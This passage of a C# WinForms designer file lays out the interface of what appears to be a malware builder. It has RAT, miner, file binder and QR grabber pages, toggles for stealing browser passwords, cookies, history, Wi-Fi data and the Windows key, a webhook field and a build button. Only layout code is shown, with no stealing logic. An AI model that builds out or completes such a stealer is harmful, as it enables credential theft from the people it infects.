            this.button13 = new System.Windows.Forms.Button();
            this.button12 = new System.Windows.Forms.Button();
            this.button10 = new System.Windows.Forms.Button();
            this.button9 = new System.Windows.Forms.Button();
            this.button11 = new System.Windows.Forms.Button();
            this.label59 = new System.Windows.Forms.Label();
            this.label58 = new System.Windows.Forms.Label();
            this.label49 = new System.Windows.Forms.Label();
            this.label48 = new System.Windows.Forms.Label();
            this.label55 = new System.Windows.Forms.Label();
            this.label63 = new System.Windows.Forms.Label();
            this.label62 = new System.Windows.Forms.Label();
            this.label61 = new System.Windows.Forms.Label();
            this.label60 = new System.Windows.Forms.Label();
            this.label56 = new System.Windows.Forms.Label();
            this.fakesSite = new System.Windows.Forms.Panel();
            this.backButton = new System.Windows.Forms.Button();
            this.mercurialBox = new System.Windows.Forms.CheckBox();
            this.desBox = new System.Windows.Forms.CheckBox();
            this.wizardBox = new System.Windows.Forms.CheckBox();
            this.nitroBox = new System.Windows.Forms.CheckBox();
            this.cmdBox = new System.Windows.Forms.CheckBox();
            this.label69 = new System.Windows.Forms.Label();
            this.guna2TabControl1 = new Guna.UI2.WinForms.Guna2TabControl();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.label144 = new System.Windows.Forms.Label();
            this.hidesBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label143 = new System.Windows.Forms.Label();
            this.sVpnBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label123 = new System.Windows.Forms.Label();
            this.swifiBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label122 = new System.Windows.Forms.Label();
            this.swinkeyBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.asd = new System.Windows.Forms.Label();
            this.sbrhisBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label39 = new System.Windows.Forms.Label();
            this.sbrCookiesBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.label65 = new System.Windows.Forms.Label();
            this.sbrpassBox = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.button6 = new Guna.UI2.WinForms.Guna2Button();
            this.button5 = new Guna.UI2.WinForms.Guna2Button();
            this.webhookCheck = new Guna.UI2.WinForms.Guna2Button();
            this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.buildButton = new Guna.UI2.WinForms.Guna2Button();
            this.webhookBox = new Guna.UI2.WinForms.Guna2TextBox();
            this.buildingLabel = new System.Windows.Forms.Label();
            this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.label67 = new System.Windows.Forms.Label();
            this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.sidePanel.SuspendLayout();
            this.panel2.SuspendLayout();
            this.settingsSite.SuspendLayout();
            this.mainSite.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.embedBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.iconBox)).BeginInit();
            this.inspectorSite.SuspendLayout();
            this.additionalSite.SuspendLayout();
            this.miscSite.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.avatarBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.flooderEmbed)).BeginInit();
            this.minerSite.SuspendLayout();
            this.ratSite.SuspendLayout();
            this.qrSite.SuspendLayout();
            this.binderSite.SuspendLayout();
            this.fakesSite.SuspendLayout();
            this.guna2TabControl1.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.tabPage2.SuspendLayout();
            this.guna2Panel2.SuspendLayout();
            this.SuspendLayout();
            // 
            // sidePanel
            // 
            this.sidePanel.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(8)))), ((int)(((byte)(8)))));
            this.sidePanel.Controls.Add(this.page2);
            this.sidePanel.Controls.Add(this.page1);
            this.sidePanel.Controls.Add(this.pnlNav);
            this.sidePanel.Controls.Add(this.binderButton);
            this.sidePanel.Controls.Add(this.btnInventory);
            this.sidePanel.Controls.Add(this.btnSettings);
            this.sidePanel.Controls.Add(this.ratButton);
            this.sidePanel.Controls.Add(this.btnParty);
            this.sidePanel.Controls.Add(this.btnMap);
            this.sidePanel.Controls.Add(this.btnWork);
            this.sidePanel.Controls.Add(this.qrButton);
            this.sidePanel.Controls.Add(this.btnDashboard);
            this.sidePanel.Controls.Add(this.panel2);
            this.sidePanel.Location = new System.Drawing.Point(29, 526);
            this.sidePanel.Name = "sidePanel";
            this.sidePanel.Size = new System.Drawing.Size(186, 251);
            this.sidePanel.TabIndex = 1;
            // 
            // page2
            // 
            this.page2.AutoSize = true;
            this.page2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.page2.Font = new System.Drawing.Font("Microsoft Sans Serif", 7F);
            this.page2.ForeColor = System.Drawing.Color.DarkRed;
            this.page2.Location = new System.Drawing.Point(167, 429);
            this.page2.Name = "page2";
            this.page2.Size = new System.Drawing.Size(13, 13);
            this.page2.TabIndex = 4;
            this.page2.Text = "2";
            this.page2.Click += new System.EventHandler(this.page2_Click);
            // 
            // page1
            // 
            this.page1.AutoSize = true;
            this.page1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.page1.Font = new System.Drawing.Font("Microsoft Sans Serif", 7F, System.Drawing.FontStyle.Bold);
            this.page1.ForeColor = System.Drawing.Color.DarkRed;
            this.page1.Location = new System.Drawing.Point(156, 429);
            this.page1.Name = "page1";
            this.page1.Size = new System.Drawing.Size(14, 13);
            this.page1.TabIndex = 4;
            this.page1.Text = "1";
            this.page1.Click += new System.EventHandler(this.page1_Click);
            // 
            // pnlNav
            // 
            this.pnlNav.BackColor = System.Drawing.Color.DarkRed;
            this.pnlNav.Location = new System.Drawing.Point(3, 182);
            this.pnlNav.Name = "pnlNav";
            this.pnlNav.Size = new System.Drawing.Size(3, 100);
            this.pnlNav.TabIndex = 3;
            // 
            // binderButton
            // 
            this.binderButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.binderButton.FlatAppearance.BorderSize = 0;
            this.binderButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.binderButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.binderButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.binderButton.ForeColor = System.Drawing.Color.DarkRed;
            this.binderButton.Location = new System.Drawing.Point(0, 192);
            this.binderButton.Name = "binderButton";
            this.binderButton.Size = new System.Drawing.Size(186, 42);
            this.binderButton.TabIndex = 1;
            this.binderButton.Text = "File binder";
            this.binderButton.UseVisualStyleBackColor = true;
            this.binderButton.Click += new System.EventHandler(this.binderButton_Click);
            this.binderButton.Leave += new System.EventHandler(this.binderButton_Leave);
            // 
            // btnInventory
            // 
            this.btnInventory.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnInventory.FlatAppearance.BorderSize = 0;
            this.btnInventory.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnInventory.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnInventory.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnInventory.ForeColor = System.Drawing.Color.DarkRed;
            this.btnInventory.Location = new System.Drawing.Point(0, 192);
            this.btnInventory.Name = "btnInventory";
            this.btnInventory.Size = new System.Drawing.Size(186, 42);
            this.btnInventory.TabIndex = 2;
            this.btnInventory.Text = "Additional";
            this.btnInventory.UseVisualStyleBackColor = true;
            this.btnInventory.Click += new System.EventHandler(this.btnInventory_Click);
            this.btnInventory.Leave += new System.EventHandler(this.btnInventory_Leave);
            // 
            // btnSettings
            // 
            this.btnSettings.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnSettings.FlatAppearance.BorderSize = 0;
            this.btnSettings.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnSettings.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnSettings.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnSettings.ForeColor = System.Drawing.Color.DarkRed;
            this.btnSettings.Location = new System.Drawing.Point(0, 535);
            this.btnSettings.Name = "btnSettings";
            this.btnSettings.Size = new System.Drawing.Size(186, 42);
            this.btnSettings.TabIndex = 2;
            this.btnSettings.Text = "Settings";
            this.btnSettings.UseVisualStyleBackColor = true;
            this.btnSettings.Click += new System.EventHandler(this.btnSettings_Click);
            this.btnSettings.Leave += new System.EventHandler(this.btnSettings_Leave);
            // 
            // ratButton
            // 
            this.ratButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.ratButton.FlatAppearance.BorderSize = 0;
            this.ratButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.ratButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.ratButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.ratButton.ForeColor = System.Drawing.Color.DarkRed;
            this.ratButton.Location = new System.Drawing.Point(0, 384);
            this.ratButton.Name = "ratButton";
            this.ratButton.Size = new System.Drawing.Size(186, 42);
            this.ratButton.TabIndex = 2;
            this.ratButton.Text = "RAT";
            this.ratButton.UseVisualStyleBackColor = true;
            this.ratButton.Click += new System.EventHandler(this.ratButton_Click);
            this.ratButton.Leave += new System.EventHandler(this.ratButton_Leave);
            // 
            // btnParty
            // 
            this.btnParty.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnParty.FlatAppearance.BorderSize = 0;
            this.btnParty.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnParty.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnParty.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnParty.ForeColor = System.Drawing.Color.DarkRed;
            this.btnParty.Location = new System.Drawing.Point(0, 336);
            this.btnParty.Name = "btnParty";
            this.btnParty.Size = new System.Drawing.Size(186, 42);
            this.btnParty.TabIndex = 2;
            this.btnParty.Text = "Miner";
            this.btnParty.UseVisualStyleBackColor = true;
            this.btnParty.Click += new System.EventHandler(this.btnParty_Click);
            this.btnParty.Leave += new System.EventHandler(this.btnParty_Leave);
            // 
            // btnMap
            // 
            this.btnMap.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnMap.FlatAppearance.BorderSize = 0;
            this.btnMap.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnMap.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnMap.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnMap.ForeColor = System.Drawing.Color.DarkRed;
            this.btnMap.Location = new System.Drawing.Point(0, 288);
            this.btnMap.Name = "btnMap";
            this.btnMap.Size = new System.Drawing.Size(186, 42);
            this.btnMap.TabIndex = 2;
            this.btnMap.Text = "Misc";
            this.btnMap.UseVisualStyleBackColor = true;
            this.btnMap.Click += new System.EventHandler(this.btnMap_Click);
            this.btnMap.Leave += new System.EventHandler(this.btnMap_Leave);
            // 
            // btnWork
            // 
            this.btnWork.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnWork.FlatAppearance.BorderSize = 0;
            this.btnWork.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnWork.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnWork.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnWork.ForeColor = System.Drawing.Color.DarkRed;
            this.btnWork.Location = new System.Drawing.Point(0, 240);
            this.btnWork.Name = "btnWork";
            this.btnWork.Size = new System.Drawing.Size(186, 42);
            this.btnWork.TabIndex = 2;
            this.btnWork.Text = "Inspector";
            this.btnWork.UseVisualStyleBackColor = true;
            this.btnWork.Click += new System.EventHandler(this.btnWork_Click);
            this.btnWork.Leave += new System.EventHandler(this.btnWork_Leave);
            // 
            // qrButton
            // 
            this.qrButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.qrButton.FlatAppearance.BorderSize = 0;
            this.qrButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.qrButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.qrButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.qrButton.ForeColor = System.Drawing.Color.DarkRed;
            this.qrButton.Location = new System.Drawing.Point(0, 144);
            this.qrButton.Name = "qrButton";
            this.qrButton.Size = new System.Drawing.Size(186, 42);
            this.qrButton.TabIndex = 1;
            this.qrButton.Text = "QR Grabber";
            this.qrButton.UseVisualStyleBackColor = true;
            this.qrButton.Click += new System.EventHandler(this.qrButton_Click);
            this.qrButton.Leave += new System.EventHandler(this.qrButton_Leave);
            // 
            // btnDashboard
            // 
            this.btnDashboard.Cursor = System.Windows.Forms.Cursors.Hand;
            this.btnDashboard.FlatAppearance.BorderSize = 0;
            this.btnDashboard.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.btnDashboard.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.btnDashboard.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.btnDashboard.ForeColor = System.Drawing.Color.DarkRed;
            this.btnDashboard.Location = new System.Drawing.Point(0, 144);
            this.btnDashboard.Name = "btnDashboard";
            this.btnDashboard.Size = new System.Drawing.Size(186, 42);
            this.btnDashboard.TabIndex = 1;
            this.btnDashboard.Text = "Main";
            this.btnDashboard.UseVisualStyleBackColor = true;
            this.btnDashboard.Click += new System.EventHandler(this.btnDashboard_Click);
            this.btnDashboard.Leave += new System.EventHandler(this.btnDashboard_Leave);
            // 
            // panel2
            // 
            this.panel2.Controls.Add(this.usernameLabel);
            this.panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel2.Location = new System.Drawing.Point(0, 0);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(186, 144);
            this.panel2.TabIndex = 1;
            // 
            // usernameLabel
            // 
            this.usernameLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F);
            this.usernameLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.usernameLabel.Location = new System.Drawing.Point(34, 97);
            this.usernameLabel.Name = "usernameLabel";
            this.usernameLabel.Size = new System.Drawing.Size(118, 25);
            this.usernameLabel.TabIndex = 2;
            this.usernameLabel.Text = "Your Username";
            this.usernameLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // settingsSite
            // 
            this.settingsSite.Controls.Add(this.saveButton);
            this.settingsSite.Controls.Add(this.translateLabel);
            this.settingsSite.Controls.Add(this.arabicButton);
            this.settingsSite.Controls.Add(this.germanButton);
            this.settingsSite.Controls.Add(this.turkishButton);
            this.settingsSite.Controls.Add(this.spanishButton);
            this.settingsSite.Controls.Add(this.polishButton);
            this.settingsSite.Controls.Add(this.frenchButton);
            this.settingsSite.Controls.Add(this.russianButton);
            this.settingsSite.Controls.Add(this.englishButton);
            this.settingsSite.Controls.Add(this.label47);
            this.settingsSite.Controls.Add(this.label7);
            this.settingsSite.Controls.Add(this.button3);
            this.settingsSite.Controls.Add(this.shNo);
            this.settingsSite.Controls.Add(this.fixButton);
            this.settingsSite.Controls.Add(this.btnUpdates);
            this.settingsSite.Controls.Add(this.shYes);
            this.settingsSite.Controls.Add(this.button2);
            this.settingsSite.Controls.Add(this.button1);
            this.settingsSite.Controls.Add(this.redButton);
            this.settingsSite.Controls.Add(this.label5);
            this.settingsSite.Controls.Add(this.versionLabel);
            this.settingsSite.Controls.Add(this.checkingLabel);
            this.settingsSite.Controls.Add(this.label3);
            this.settingsSite.Controls.Add(this.label2);
            this.settingsSite.Controls.Add(this.label1);
            this.settingsSite.Location = new System.Drawing.Point(725, 274);
            this.settingsSite.Name = "settingsSite";
            this.settingsSite.Size = new System.Drawing.Size(283, 425);
            this.settingsSite.TabIndex = 4;
            // 
            // saveButton
            // 
            this.saveButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.saveButton.FlatAppearance.BorderSize = 0;
            this.saveButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.saveButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.saveButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.saveButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 13F);
            this.saveButton.ForeColor = System.Drawing.Color.DarkRed;
            this.saveButton.Location = new System.Drawing.Point(611, 457);
            this.saveButton.Name = "saveButton";
            this.saveButton.Size = new System.Drawing.Size(116, 37);
            this.saveButton.TabIndex = 21;
            this.saveButton.Text = "Save";
            this.saveButton.UseVisualStyleBackColor = true;
            this.saveButton.Click += new System.EventHandler(this.saveButton_Click);
            // 
            // translateLabel
            // 
            this.translateLabel.AutoSize = true;
            this.translateLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.translateLabel.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(5)))), ((int)(((byte)(5)))), ((int)(((byte)(5)))));
            this.translateLabel.Location = new System.Drawing.Point(311, 474);
            this.translateLabel.Name = "translateLabel";
            this.translateLabel.Size = new System.Drawing.Size(27, 16);
            this.translateLabel.TabIndex = 19;
            this.translateLabel.Text = "null";
            // 
            // arabicButton
            // 
            this.arabicButton.Location = new System.Drawing.Point(0, 0);
            this.arabicButton.Name = "arabicButton";
            this.arabicButton.Size = new System.Drawing.Size(75, 23);
            this.arabicButton.TabIndex = 22;
            // 
            // germanButton
            // 
            this.germanButton.Location = new System.Drawing.Point(0, 0);
            this.germanButton.Name = "germanButton";
            this.germanButton.Size = new System.Drawing.Size(75, 23);
            this.germanButton.TabIndex = 23;
            // 
            // turkishButton
            // 
            this.turkishButton.Location = new System.Drawing.Point(0, 0);
            this.turkishButton.Name = "turkishButton";
            this.turkishButton.Size = new System.Drawing.Size(75, 23);
            this.turkishButton.TabIndex = 24;
            // 
            // spanishButton
            // 
            this.spanishButton.Location = new System.Drawing.Point(0, 0);
            this.spanishButton.Name = "spanishButton";
            this.spanishButton.Size = new System.Drawing.Size(75, 23);
            this.spanishButton.TabIndex = 25;
            // 
            // polishButton
            // 
            this.polishButton.Location = new System.Drawing.Point(0, 0);
            this.polishButton.Name = "polishButton";
            this.polishButton.Size = new System.Drawing.Size(75, 23);
            this.polishButton.TabIndex = 26;
            // 
            // frenchButton
            // 
            this.frenchButton.Location = new System.Drawing.Point(0, 0);
            this.frenchButton.Name = "frenchButton";
            this.frenchButton.Size = new System.Drawing.Size(75, 23);
            this.frenchButton.TabIndex = 27;
            // 
            // russianButton
            // 
            this.russianButton.Location = new System.Drawing.Point(0, 0);
            this.russianButton.Name = "russianButton";
            this.russianButton.Size = new System.Drawing.Size(75, 23);
            this.russianButton.TabIndex = 28;
            // 
            // englishButton
            // 
            this.englishButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.englishButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.englishButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.englishButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.englishButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.englishButton.ForeColor = System.Drawing.Color.DarkRed;
            this.englishButton.Location = new System.Drawing.Point(126, 239);
            this.englishButton.Name = "englishButton";
            this.englishButton.Size = new System.Drawing.Size(71, 28);
            this.englishButton.TabIndex = 12;
            this.englishButton.Text = "English";
            this.englishButton.UseVisualStyleBackColor = true;
            this.englishButton.Click += new System.EventHandler(this.englishButton_Click);
            // 
            // label47
            // 
            this.label47.AutoSize = true;
            this.label47.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label47.ForeColor = System.Drawing.Color.DarkRed;
            this.label47.Location = new System.Drawing.Point(5, 289);
            this.label47.Name = "label47";
            this.label47.Size = new System.Drawing.Size(110, 24);
            this.label47.TabIndex = 11;
            this.label47.Text = "AppData fix:";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label7.ForeColor = System.Drawing.Color.DarkRed;
            this.label7.Location = new System.Drawing.Point(5, 237);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(100, 24);
            this.label7.TabIndex = 11;
            this.label7.Text = "Language:";
            // 
            // button3
            // 
            this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button3.FlatAppearance.BorderSize = 0;
            this.button3.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(160)))), ((int)(((byte)(160)))), ((int)(((byte)(160)))));
            this.button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button3.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.button3.ForeColor = System.Drawing.Color.Gainsboro;
            this.button3.Location = new System.Drawing.Point(338, 90);
            this.button3.Name = "button3";
            this.button3.Size = new System.Drawing.Size(71, 28);
            this.button3.TabIndex = 10;
            this.button3.Text = "White";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new System.EventHandler(this.button3_Click);
            // 
            // shNo
            // 
            this.shNo.Cursor = System.Windows.Forms.Cursors.Hand;
            this.shNo.FlatAppearance.BorderSize = 0;
            this.shNo.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.shNo.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.shNo.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.shNo.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.shNo.ForeColor = System.Drawing.Color.DarkRed;
            this.shNo.Location = new System.Drawing.Point(248, 140);
            this.shNo.Name = "shNo";
            this.shNo.Size = new System.Drawing.Size(58, 28);
            this.shNo.TabIndex = 9;
            this.shNo.Text = "No";
            this.shNo.UseVisualStyleBackColor = true;
            this.shNo.Click += new System.EventHandler(this.shNo_Click);
            // 
            // fixButton
            // 
            this.fixButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.fixButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.fixButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.fixButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.fixButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.fixButton.ForeColor = System.Drawing.Color.DarkRed;
            this.fixButton.Location = new System.Drawing.Point(140, 291);
            this.fixButton.Name = "fixButton";
            this.fixButton.Size = new System.Drawing.Size(58, 28);
            this.fixButton.TabIndex = 8;
            this.fixButton.Text = "Fix";
            this.fixButton.UseVisualStyleBackColor = true;
            this.fixButton.Click += new System.EventHandler(this.fixButton_Click);
            // 
            // btnUpdates
            // 
            this.btnUpdates.Location = new System.Drawing.Point(0, 0);
            this.btnUpdates.Name = "btnUpdates";
            this.btnUpdates.Size = new System.Drawing.Size(75, 23);
            this.btnUpdates.TabIndex = 29;
            // 
            // shYes
            // 
            this.shYes.Cursor = System.Windows.Forms.Cursors.Hand;
            this.shYes.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.shYes.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.shYes.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.shYes.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.shYes.ForeColor = System.Drawing.Color.DarkRed;
            this.shYes.Location = new System.Drawing.Point(184, 140);
            this.shYes.Name = "shYes";
            this.shYes.Size = new System.Drawing.Size(58, 28);
            this.shYes.TabIndex = 8;
            this.shYes.Text = "Yes";
            this.shYes.UseVisualStyleBackColor = true;
            this.shYes.Click += new System.EventHandler(this.shYes_Click);
            // 
            // button2
            // 
            this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button2.FlatAppearance.BorderSize = 0;
            this.button2.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(60)))));
            this.button2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(50)))));
            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.button2.ForeColor = System.Drawing.Color.DodgerBlue;
            this.button2.Location = new System.Drawing.Point(261, 90);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(71, 28);
            this.button2.TabIndex = 7;
            this.button2.Text = "Blue";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click);
            // 
            // button1
            // 
            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(60)))), ((int)(((byte)(0)))));
            this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(50)))), ((int)(((byte)(0)))));
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.button1.ForeColor = System.Drawing.Color.LimeGreen;
            this.button1.Location = new System.Drawing.Point(184, 90);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(71, 28);
            this.button1.TabIndex = 6;
            this.button1.Text = "Green";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // redButton
            // 
            this.redButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.redButton.FlatAppearance.MouseDownBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.redButton.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.redButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.redButton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.redButton.ForeColor = System.Drawing.Color.DarkRed;
            this.redButton.Location = new System.Drawing.Point(107, 90);
            this.redButton.Name = "redButton";
            this.redButton.Size = new System.Drawing.Size(71, 28);
            this.redButton.TabIndex = 5;
            this.redButton.Text = "Red";
            this.redButton.UseVisualStyleBackColor = true;
            this.redButton.Click += new System.EventHandler(this.redButton_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label5.ForeColor = System.Drawing.Color.DarkRed;
            this.label5.Location = new System.Drawing.Point(5, 187);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(142, 24);
            this.label5.TabIndex = 4;
            this.label5.Text = "Check-updates:";
            // 
            // versionLabel
            // 
            this.versionLabel.AutoSize = true;
            this.versionLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.versionLabel.ForeColor = System.Drawing.Color.DarkRed;
            this.versionLabel.Location = new System.Drawing.Point(101, 36);
            this.versionLabel.Name = "versionLabel";
            this.versionLabel.Size = new System.Drawing.Size(55, 24);
            this.versionLabel.TabIndex = 3;
